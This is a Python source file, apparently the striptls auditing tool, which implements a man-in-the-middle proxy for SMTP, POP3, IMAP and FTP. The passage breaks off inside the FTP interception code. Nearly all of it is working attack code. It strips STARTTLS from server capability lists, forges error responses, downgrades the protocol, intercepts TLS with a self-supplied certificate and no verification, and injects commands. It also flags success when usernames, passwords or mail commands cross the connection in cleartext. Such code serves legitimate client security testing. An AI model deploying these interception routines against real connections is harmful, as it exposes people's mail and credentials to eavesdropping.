#! /usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : <github.com/tintinweb>
'''
                  inbound                    outbound
[inbound_peer]<------------>[listen:proxy]<------------->[outbound_peer/target]
'''
import sys
import os
import logging
import socket
import select
import ssl
import time
import re

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)-8s - %(message)s')
logger = logging.getLogger(__name__)

class SessionTerminatedException(Exception):pass
class ProtocolViolationException(Exception):pass

class TcpSockBuff(object):
    ''' Wrapped Tcp Socket with access to last sent/received data '''
    def __init__(self, sock, peer=None):
        self.socket = None
        self.socket_ssl = None
        self.recvbuf = ''
        self.sndbuf = ''
        self.peer = peer
        self._init(sock)
        
    def _init(self, sock):
        self.socket = sock
        
    def connect(self, target=None):
        target = target or self.peer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return self.socket.connect(target)
    
    def accept(self):
        return self.socket.accept()
                
    def recv(self, buflen=8*1024, *args, **kwargs):
        if self.socket_ssl:
            chunks = []
            chunk = True
            data_pending = buflen
            while chunk and data_pending:
                chunk = self.socket_ssl.read(data_pending)
                chunks.append(chunk)
                data_pending = self.socket_ssl.pending()
            self.recvbuf = ''.join(chunks)
        else:
            self.recvbuf = self.socket.recv(buflen, *args, **kwargs)
        return self.recvbuf
    
    def recv_blocked(self, buflen=8*1024, timeout=None, *args, **kwargs):
        force_first_loop_iteration = True
        end = time.time()+timeout if timeout else 0
        while force_first_loop_iteration or (not timeout or time.time()<end):
            # force one recv otherwise we might not even try to read if timeout is too narrow
            try:
                return self.recv(buflen=buflen, *args, **kwargs)
            except ssl.SSLWantReadError:
                pass
            force_first_loop_iteration = False
 
    def send(self, data, retransmit_delay=0.1):
        if self.socket_ssl:
            last_exception = None
            for _ in xrange(3):
                try:
                    self.socket_ssl.write(data)
                    last_exception = None
                    break
                except ssl.SSLWantWriteError,swwe:
                    logger.warning("TCPSockBuff: ssl.sock not yet ready, retransmit (%d) in %f seconds: %s"%(_,retransmit_delay,repr(swwe)))
                    last_exception = swwe
                time.sleep(retransmit_delay)
            if last_exception:
                raise last_exception
        else:
            self.socket.send(data)
        self.sndbuf = data
        
    def sendall(self, data):
        if self.socket_ssl:
            self.send(data)
        else:
            self.socket.sendall(data)
        self.sndbuf = data
        
    def ssl_wrap_socket(self, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ssl.wrap_socket(*args, **kwargs)
        self.socket_ssl.setblocking(0) # nonblocking for select
    
    def ssl_wrap_socket_with_context(self, ctx, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ctx.wrap_socket(*args, **kwargs)
        self.socket_ssl.setblocking(0) # nonblocking for select
        
class ProtocolDetect(object):
    PROTO_SMTP = 25
    PROTO_XMPP = 5222
    PROTO_IMAP = 143
    PROTO_FTP = 21
    PROTO_POP3 = 110
    PROTO_NNTP = 119
    PROTO_IRC = 6667
    PROTO_ACAP = 675
    PROTO_SSL = 443
 
    PORTMAP = {25:  PROTO_SMTP,
               5222:PROTO_XMPP,
               110: PROTO_POP3,
               143: PROTO_IMAP,
               21: PROTO_FTP,
               119: PROTO_NNTP,
               6667: PROTO_IRC,
               675: PROTO_ACAP
               }
    
    KEYWORDS = ((['ehlo', 'helo','starttls','rcpt to:','mail from:'], PROTO_SMTP),
                (['xmpp'], PROTO_XMPP),
                (['. capability'], PROTO_IMAP),
                (['auth tls'], PROTO_FTP)
                )
    
    def __init__(self, target=None):
        self.protocol_id = None
        self.history = []
        if target:
            self.protocol_id = self.PORTMAP.get(target[1])
            if self.protocol_id:
                logger.debug("%s - protocol detected (target port)"%repr(self))
    
    def __str__(self):
        return repr(self.proto_id_to_name(self.protocol_id))
    
    def __repr__(self):
        return "<ProtocolDetect %s protocol_id=%s len_history=%d>"%(hex(id(self)), self.proto_id_to_name(self.protocol_id), len(self.history))
            
    def proto_id_to_name(self, id):
        if not id:
            return id
        for p in (a for a in dir(self) if a.startswith("PROTO_")):
            if getattr(self, p)==id:
                return p   

    def detect_peek_tls(self, sock):
        if sock.socket_ssl:
            raise Exception("SSL Detection for ssl socket ..whut!")
        TLS_VERSIONS = {
            # SSL
            '\x00\x02':"SSL_2_0",
            '\x03\x00':"SSL_3_0",
            # TLS
            '\x03\x01':"TLS_1_0",
            '\x03\x02':"TLS_1_1",
            '\x03\x03':"TLS_1_2",
            '\x03\x04':"TLS_1_3",
            }
        TLS_CONTENT_TYPE_HANDSHAKE = '\x16'
        SSLv2_PREAMBLE = 0x80
        SSLv2_CONTENT_TYPE_CLIENT_HELLO ='\x01'
        
        peek_bytes = sock.recv(5, socket.MSG_PEEK)
        if not len(peek_bytes)==5:
            return
        # detect sslv2, sslv3, tls: one symbol is one byte;  T .. type
        #                                                    L .. length 
        #                                                    V .. version
        #               01234
        # detect sslv2  LLTVV                T=0x01 ... MessageType.client_hello; L high bit set.
        #        sslv3  TVVLL      
        #        tls    TVVLL                T=0x16 ... ContentType.Handshake
        v = None
        if ord(peek_bytes[0]) & SSLv2_PREAMBLE \
            and peek_bytes[2]==SSLv2_CONTENT_TYPE_CLIENT_HELLO \
            and peek_bytes[3:3+2] in TLS_VERSIONS.keys():
            v = TLS_VERSIONS.get(peek_bytes[3:3+2])
            logger.info("ProtocolDetect: SSL23/TLS version: %s"%v)
        elif peek_bytes[0] == TLS_CONTENT_TYPE_HANDSHAKE \
            and peek_bytes[1:1+2] in TLS_VERSIONS.keys():
            v = TLS_VERSIONS.get(peek_bytes[1:1+2])  
            logger.info("ProtocolDetect: TLS version: %s"%v)
        return v
            

    def detect(self, data):
        if self.protocol_id:
            return self.protocol_id
        self.history.append(data)
        for keywordlist,proto in self.KEYWORDS:
            if any(k in data.lower() for k in keywordlist):
                self.protocol_id = proto
                logger.debug("%s - protocol detected (protocol messages)"%repr(self))
                return
        
class Session(object):
    ''' Proxy session from client <-> proxy <-> server 
        @param inbound: inbound socket
        @param outbound: outbound socket
        @param target: target tuple ('ip',port) 
        @param buffer_size: socket buff size'''
    
    def __init__(self, proxy, inbound=None, outbound=None, target=None, buffer_size=4096):
        self.proxy = proxy
        self.bind = proxy.getsockname()
        self.inbound = TcpSockBuff(inbound)
        self.outbound = TcpSockBuff(outbound, peer=target)
        self.buffer_size = buffer_size
        self.protocol = ProtocolDetect(target=target)
        self.datastore = {}
    
    def __repr__(self):
        return "<Session %s [client: %s] --> [prxy: %s] --> [target: %s]>"%(hex(id(self)),
                                                                            self.inbound.peer,
                                                                            self.bind,
                                                                            self.outbound.peer)
    def __str__(self):
        return "<Session %s>"%hex(id(self))
        
    def connect(self, target):
        self.outbound.peer = target
        logger.info("%s connecting to target %s"%(self, repr(target)))
        return self.outbound.connect(target)
    
    def accept(self):
        sock, addr = self.proxy.accept()
        self.inbound = TcpSockBuff(sock)
        self.inbound.peer = addr
        logger.info("%s client %s has connected"%(self,repr(self.inbound.peer)))
        return sock,addr
    
    def get_peer_sockets(self):
        return [self.inbound.socket, self.outbound.socket]
    
    def notify_read(self, sock):
        if sock == self.proxy:
            self.accept()
            self.connect(self.outbound.peer)
        elif sock == self.inbound.socket:
            # new client -> prxy - data
            self.on_recv_peek(self.inbound, self)
            self.on_recv(self.inbound, self.outbound, self)
        elif sock == self.outbound.socket:
            # new sprxy <- target - data
            self.on_recv(self.outbound, self.inbound, self)
        return 
    
    def close(self):
        try:
            self.outbound.socket.shutdown(2)
            self.outbound.socket.close()
            self.inbound.socket.shutdown(2)
            self.inbound.socket.close()
        except socket.error, se:
            logger.warning("session.close(): Exception: %s"%repr(se))
        raise SessionTerminatedException()
    
    def on_recv(self, s_in, s_out, session):
        data = s_in.recv(session.buffer_size)
        self.protocol.detect(data)
        if not len(data):
            return session.close()
        if s_in == session.inbound:
            data = self.mangle_client_data(session, data)
        elif s_in == session.outbound:
            data = self.mangle_server_data(session, data)
        if data:
            s_out.sendall(data)
        return data
    
    def on_recv_peek(self, s_in, session): pass
    def mangle_client_data(self, session, data, rewrite): return data
    def mangle_server_data(self, session, data, rewrite): return data
    
class ProxyServer(object):
    '''Proxy Class'''
    
    def __init__(self, listen, target, buffer_size=4096, delay=0.0001):
        self.input_list = set([])
        self.sessions = {}  # sock:Session()
        self.callbacks = {} # name: [f,..]
        #
        self.listen = listen
        self.target = target
        #
        self.buffer_size = buffer_size
        self.delay = delay
        self.bind = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bind.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.bind.bind(listen)
        self.bind.listen(200)
        
    def __str__(self):
        return "<Proxy %s listen=%s target=%s>"%(hex(id(self)),self.listen, self.target)

    def get_session_by_client_sock(self, sock):
        return self.sessions.get(sock)

    def set_callback(self, name, f):
        self.callbacks[name] = f

    def main_loop(self):
        self.input_list.add(self.bind)
        while True:
            time.sleep(self.delay)
            inputready, _, _ =  select.select(self.input_list, [], [])
            
            for sock in inputready:
                if not sock in self.input_list: 
                    # Check if inputready sock is still in the list of socks to read from
                    # as SessionTerminateException might remove multiple sockets from that list
                    # this might otherwise lead to bad FD access exceptions
                    continue
                session = None
                try:
                    if sock == self.bind:
                        # on_accept
                        session = Session(sock, target=self.target)
                        for k,v in self.callbacks.iteritems():
                            setattr(session, k, v)
                        session.notify_read(sock)
                        for s in session.get_peer_sockets():
                            self.sessions[s]=session
                        self.input_list.update(session.get_peer_sockets())
                    else:
                        # on_recv
                        try:
                            session = self.get_session_by_client_sock(sock)
                            session.notify_read(sock)
                        except ssl.SSLError, se:
                            if se.errno != ssl.SSL_ERROR_WANT_READ:
                                raise
                            continue
                        except SessionTerminatedException:
                            self.input_list.difference_update(session.get_peer_sockets())
                            logger.warning("%s terminated."%session)
                except Exception, e:
                    logger.error("main: %s"%repr(e))
                    if isinstance(e,IOError):
                        for kname,value in ((a,getattr(Vectors,a)) for a in dir(Vectors) if a.startswith("_TLS_")):
                            if not os.path.isfile(value):
                                logger.error("%s = %s - file not found"%(kname, repr(value)))
                    if session:
                        logger.error("main: removing all sockets associated with session that raised exception: %s"%repr(session))
                        try:
                            session.close()
                        except SessionTerminatedException: pass
                        self.input_list.difference_update(session.get_peer_sockets())
                    elif sock and sock!=self.bind:
                        # exception for non-bind socket - probably fine to close and remove it from our list
                        logger.error("main: removing socket that probably raised the exception")
                        sock.close()
                        self.input_list.remove(sock)
                    else:
                        # this is just super-fatal - something happened while processing our bind socket.
                        raise        

class Vectors:
    _TLS_CERTFILE = "server.pem"
    _TLS_KEYFILE = "server.pem"
    
    class GENERIC:
        _PROTO_ID = None
        class Intercept:
            '''
            proto independent msg_peek based tls interception
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite): return data
            @staticmethod
            def mangle_client_data(session, data, rewrite): return data
            @staticmethod
            def on_recv_peek(session, s_in):
                if s_in.socket_ssl:
                    return

                ssl_version = session.protocol.detect_peek_tls(s_in)
                if ssl_version:
                    logger.info("SSL Handshake detected - performing ssl/tls conversion")
                    try:
                        context = Vectors.GENERIC.Intercept.create_ssl_context()
                        context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                                keyfile=Vectors._TLS_KEYFILE)
                        session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                        logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                        session.outbound.ssl_wrap_socket_with_context(context, server_side=False)
                        logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
                    except Exception, e:
                        logger.warning("Exception - not ssl intercepting outbound: %s"%repr(e))
                
            @staticmethod
            def create_ssl_context(proto=ssl.PROTOCOL_SSLv23, 
                                   verify_mode=ssl.CERT_NONE,
                                   protocols=None,
                                   options=None,
                                   ciphers="ALL"):
                protocols = protocols or ('PROTOCOL_SSLv3','PROTOCOL_TLSv1',
                                          'PROTOCOL_TLSv1_1','PROTOCOL_TLSv1_2')
                options = options or ('OP_CIPHER_SERVER_PREFERENCE','OP_SINGLE_DH_USE',
                                      'OP_SINGLE_ECDH_USE','OP_NO_COMPRESSION')
                context = ssl.SSLContext(proto)
                context.verify_mode = verify_mode
                # reset protocol, options
                context.protocol = 0
                context.options = 0
                for p in protocols:
                    context.protocol |= getattr(ssl, p, 0)
                for o in options:
                    context.options |= getattr(ssl, o, 0)
                context.set_ciphers(ciphers)
                return context
                
        class InboundIntercept:
            '''
            proto independent msg_peek based tls interception
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                # peek again - make sure to check for inbound ssl connections
                #  before forwarding data to the inbound channel
                # just in case server is faster with answer than client with hello
                #  likely if smtpd and striptls are running on the same segment
                #  and client is not.
                if not session.inbound.socket_ssl:
                    # only peek if inbound is not in tls mode yet
                    # kind of a hack but allow additional 0.1 secs for the client
                    #  to send its hello
                    time.sleep(0.1)
                    Vectors.GENERIC.InterceptInbound.on_recv_peek(session, session.inbound)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite): 
                return data
            @staticmethod
            def on_recv_peek(session, s_in):
                if s_in.socket_ssl:
                    return

                ssl_version = session.protocol.detect_peek_tls(s_in)
                if ssl_version:
                    logger.info("SSL Handshake detected - performing ssl/tls conversion")
                    try:
                        context = Vectors.GENERIC.Intercept.create_ssl_context()
                        context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                                keyfile=Vectors._TLS_KEYFILE)
                        session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                        logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    except Exception, e:
                        logger.warning("Exception - not ssl intercepting inbound: %s"%repr(e))
            
    class SMTP:
        _PROTO_ID = 25
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                    features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
                    if not features[-1].startswith("250 "):
                        features[-1] = features[-1].replace("250-","250 ")  # end marker
                    data = '\r\n'.join(features)+'\r\n' 
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class StripWithInvalidResponseCode:
            ''' 1) Force Server response to contain STARTTLS even though it does not support it (just because we can)
                2) Respond to client STARTTLS with invalid response code
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                    features = list(data.strip().split("\r\n"))
                    features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
                    #if "STARTTLS" in data:
                    #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
                    data = '\r\n'.join(features)+'\r\n' 
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("200 STRIPTLS\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class StripWithTemporaryError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("454 TLS not available due to temporary reason\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("454 TLS not available due to temporary reason\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
    
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("501 Syntax error\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("501 Syntax error\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("220 Go ahead\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("220 Go ahead\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    
                    # outbound ssl
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if "220" not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()    
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
                    
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
           
        class InboundStarttlsProxy:
            ''' Inbound is starttls, outbound is plain
                1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                # keep track of stripped server ehlo/helo
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data and not session.datastore.get("server_ehlo_stripped"): #only do this once
                    # wait for full line
                    while not "250 " in data:
                        data+=session.outbound.recv_blocked()
                        
                    features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
                    if features and not features[-1].startswith("250 "):
                        features[-1] = features[-1].replace("250-","250 ")  # end marker
                    # force starttls announcement
                    session.datastore['server_ehlo_stripped']= '\r\n'.join(features)+'\r\n' # stripped
                    
                    if len(features)>1:
                        features.insert(-1,"250-STARTTLS")
                    else:
                        features.append("250 STARTTLS")
                        features[0]=features[0].replace("250 ","250-")
                    data = '\r\n'.join(features)+'\r\n' # forced starttls
                    session.datastore['server_ehlo'] = data
       
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("220 Go ahead\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("220 Go ahead\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # inbound ssl, fake server ehlo on helo/ehlo
                    indata = session.inbound.recv_blocked()
                    if not any(e in indata for e in ('ehlo','helo')):
                       raise ProtocolViolationException("whoop!? client did not send EHLO/HELO after STARTTLS finished.. proto violation: %s"%repr(indata))
                    logger.debug("%s [client] => [      ][mangled] %s"%(session,repr(indata)))
                    session.inbound.sendall(session.datastore["server_ehlo_stripped"])
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr(session.datastore["server_ehlo_stripped"])))
                    data=None
                elif any(e in data for e in ('ehlo','helo')) and session.datastore.get("server_ehlo_stripped"):
                    # just do not forward the second ehlo/helo
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
 
        class ProtocolDowngradeStripExtendedMode:
            ''' Return error on EHLO to force peer to non-extended mode
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.lower().startswith("ehlo "):
                    session.inbound.sendall("502 Error: command \"EHLO\" not implemented\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Error: command \"EHLO\" not implemented\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class InjectCommand:
            ''' 1) Append command to STARTTLS\r\n.
                2) untrusted intercept to check if we get an invalid command response from server
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    data += "INJECTED_INVALID_COMMAND\r\n"
                    #logger.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
                    try:
                        Vectors.SMTP.UntrustedIntercept.mangle_client_data(session, data, rewrite)
                    except ssl.SSLEOFError, se:
                        logging.info("%s - Server failed to negotiate SSL with Exception: %s"%(session, repr(se))) 
                        session.close()
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
    
    class POP3:
        _PROTO_ID = 110

        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STLS support
                2) raise exception if client tries to negotiated STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if data.lower().startswith('+ok capability'):
                    features = [f for f in data.strip().split('\r\n') if not "stls" in f.lower()]
                    data = '\r\n'.join(features)+'\r\n'
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.lower().startswith("stls"):
                    raise ProtocolViolationException("whoop!? client sent STLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "stls" == data.strip().lower():
                    session.inbound.sendall("-ERR unknown command\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("-ERR unknown command\r\n")))
                    data=None
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "stls"==data.strip().lower():
                    # do inbound STARTTLS
                    session.inbound.sendall("+OK Begin TLS negotiation\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("+OK Begin TLS negotiation\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_CERTFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if "+OK" not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
    
                    data=None
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data
            
    class IMAP:
        _PROTO_ID = 143
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "CAPABILITY " in data:
                    # rfc2595
                    data = data.replace(" STARTTLS","").replace(" LOGINDISABLED","")
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data
            
        class StripWithError:
            ''' 1) force server error on client sending STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.strip().lower().endswith("starttls"):
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall("%s BAD unknown command\r\n"%id)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s BAD unknown command\r\n"%id)))
                    data=None
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data

        class ProtocolDowngradeToV2:
            ''' Return IMAP2 instead of IMAP4 in initial server response
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw.lower() in data.lower() for kw in ("IMAP4","* OK ")):
                    session.inbound.sendall("OK IMAP2 Server Ready\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("OK IMAP2 Server Ready\r\n")))
                    data=None
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.strip().lower().endswith("starttls"):
                    id = data.split(' ',1)[0].strip()
                    # do inbound STARTTLS
                    session.inbound.sendall("%s OK Begin TLS negotation now\r\n"%id)
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("%s OK Begin TLS negotation now\r\n"%id)))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_CERTFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
    
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if "%s OK"%id not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
    
                    data=None
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data
            
    class FTP:
        _PROTO_ID = 21
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce AUTH TLS support
                2) raise exception if client tries to negotiated AUTH TLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if session.outbound.sndbuf.strip().lower()=="feat" \
                    and "AUTH TLS" in data:
                    features = (f for f in data.strip().split('\n') if not "AUTH TLS" in f)
                    data = '\n'.join(features)+"\r\n"
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending AUTH TLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    session.inbound.sendall("500 AUTH TLS not understood\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("500 AUTH TLS not understood\r\n")))
                    data=None
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("234 OK Begin TLS negotation now\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("234 OK Begin TLS negotation now\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
